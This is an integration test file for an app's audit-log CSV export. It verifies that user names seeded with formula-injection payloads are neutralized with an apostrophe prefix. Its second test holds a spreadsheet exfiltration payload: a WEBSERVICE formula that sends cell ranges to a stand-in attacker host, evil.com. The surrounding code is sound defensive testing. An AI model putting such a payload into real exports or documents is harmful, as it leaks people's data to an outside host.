import { describe, expect, test } from "bun:test";
import { db } from "@wateaminbox/database";
import { app } from "../app.js";
import { hashPassword } from "../lib/password.js";
import {
  clearTenantConnection,
  createTenantSchema,
  dropTenantSchema,
  getSchemaName,
  getTenantConnection,
} from "../services/tenant.service.js";

const integrationTest =
  process.env.RUN_DB_INTEGRATION === "1" ? test : test.skip;
const PASSWORD = "Audit-export-test-password-123!";

async function loginHeaders(email: string, companyId: string) {
  const response = await app.request("/api/auth/login", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email, password: PASSWORD }),
  });
  expect(response.status, "owner login must succeed").toBe(200);
  const body = (await response.json()) as { tokens: { accessToken: string } };
  return {
    authorization: `Bearer ${body.tokens.accessToken}`,
    "x-company-id": companyId,
  };
}

/**
 * RFC-4180-ish row parser mirroring the unit test, so an injected payload
 * containing commas/quotes cannot fool the assertion by splitting a row.
 */
function parseCSVRow(line: string): string[] {
  const cells: string[] = [];
  let i = 0;
  while (true) {
    if (i < line.length && line[i] === '"') {
      let value = "";
      i += 1; // skip opening quote
      while (i < line.length) {
        if (line[i] === '"') {
          if (line[i + 1] === '"') {
            value += '"';
            i += 2;
          } else {
            i += 1; // skip closing quote
            break;
          }
        } else {
          value += line[i];
          i += 1;
        }
      }
      cells.push(value);
    } else {
      let value = "";
      while (i < line.length && line[i] !== "," && line[i] !== '"') {
        value += line[i];
        i += 1;
      }
      cells.push(value);
    }
    if (i >= line.length) break;
    if (line[i] === ",") {
      i += 1;
      continue;
    }
    break;
  }
  return cells;
}

const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@"]);

async function seedAndExport(poisonedNames: Map<string, string>) {
  const companyId = crypto.randomUUID();
  const ownerId = crypto.randomUUID();
  const ownerEmail = `audit-owner-${ownerId}@example.com`;
  const attackerIds = [...poisonedNames.keys()];
  let schemaCreated = false;

  await db
    .insertInto("users")
    .values([
      {
        id: ownerId,
        email: ownerEmail,
        password_hash: await hashPassword(PASSWORD),
        email_verified_at: new Date(),
      },
      ...attackerIds.map((id) => ({
        id,
        email: `audit-attacker-${id}@example.com`,
        password_hash: "",
        email_verified_at: new Date(),
        name: poisonedNames.get(id)!,
      })),
    ])
    .execute();
  await db
    .insertInto("companies")
    .values({
      id: companyId,
      name: "Audit export CSV-injection test",
      schema_name: getSchemaName(companyId),
      status: "active",
    })
    .execute();
  await db
    .insertInto("company_members")
    .values([
      { company_id: companyId, user_id: ownerId, role: "owner" },
      ...attackerIds.map((id) => ({
        company_id: companyId,
        user_id: id,
        role: "member" as const,
      })),
    ])
    .execute();
  await createTenantSchema(companyId);
  schemaCreated = true;

  const tenantDb = getTenantConnection(companyId);
  await tenantDb
    .insertInto("audit_logs")
    .values(
      attackerIds.map((id) => ({
        user_id: id,
        action: "user.login",
      })),
    )
    .execute();

  try {
    const headers = await loginHeaders(ownerEmail, companyId);
    const response = await app.request("/api/audit/export", { headers });
    return { response, companyId, ownerId, attackerIds };
  } finally {
    await clearTenantConnection(companyId);
    if (schemaCreated) await dropTenantSchema(companyId);
    await db
      .deleteFrom("company_members")
      .where("company_id", "=", companyId)
      .execute();
    await db.deleteFrom("companies").where("id", "=", companyId).execute();
    await db
      .deleteFrom("users")
      .where("id", "in", [ownerId, ...attackerIds])
      .execute();
  }
}

describe("GET /audit/export (integration)", () => {
  integrationTest(
    "neutralizes a CSV-injected Actor name end-to-end (proof =1+1)",
    async () => {
      const poisonedName = "=1+1";
      const attackerId = crypto.randomUUID();
      const { response } = await seedAndExport(
        new Map([[attackerId, poisonedName]]),
      );

      expect(response.status).toBe(200);
      expect(response.headers.get("content-type")).toBe("text/csv");
      const disposition = response.headers.get("content-disposition") || "";
      expect(disposition).toMatch(
        /attachment; filename="audit-logs-\d{4}-\d{2}-\d{2}\.csv"/,
      );

      const body = await response.text();
      const lines = body.split("\n");
      expect(lines[0]).toBe(
        "ID,Actor,Actor Email,Action,Entity Type,Entity ID,Details,IP Address,Created At",
      );

      const dataRows = lines.slice(1);
      const attackerEmail = `audit-attacker-${attackerId}@example.com`;
      const poisonedRow = dataRows.find((row) => {
        const cells = parseCSVRow(row);
        return cells[2] === attackerEmail;
      });
      expect(
        poisonedRow,
        "attacker's audit row must be in the export",
      ).toBeDefined();

      const cells = parseCSVRow(poisonedRow!);
      expect(cells).toHaveLength(9);
      // Actor cell neutralized to inert text and round-trips the payload.
      expect(cells[1]).toBe(`'${poisonedName}`);

      // No data-row Actor cell may be a live formula.
      for (const row of dataRows) {
        const actor = parseCSVRow(row)[1];
        if (FORMULA_TRIGGERS.has(actor.charAt(0))) {
          throw new Error(`un-neutralized formula cell: ${actor}`);
        }
      }
    },
    30_000,
  );

  integrationTest(
    "neutralizes the WEBSERVICE+TEXTJOIN exfiltration payload and keeps it in one cell",
    async () => {
      const payload =
        '=WEBSERVICE("http://evil.com/?"&TEXTJOIN("|",TRUE,C2:I50))';
      const attackerId = crypto.randomUUID();
      const { response } = await seedAndExport(
        new Map([[attackerId, payload]]),
      );

      expect(response.status).toBe(200);
      const body = await response.text();
      const lines = body.split("\n");
      const attackerEmail = `audit-attacker-${attackerId}@example.com`;
      const poisonedRow = lines
        .slice(1)
        .find((row) => parseCSVRow(row)[2] === attackerEmail);
      expect(poisonedRow).toBeDefined();

      const cells = parseCSVRow(poisonedRow!);
      // The internal commas/quotes must not split the row.
      expect(cells).toHaveLength(9);
      // Neutralized + round-trips the full payload.
      expect(cells[1]).toBe(`'${payload}`);
    },
    30_000,
  );
});
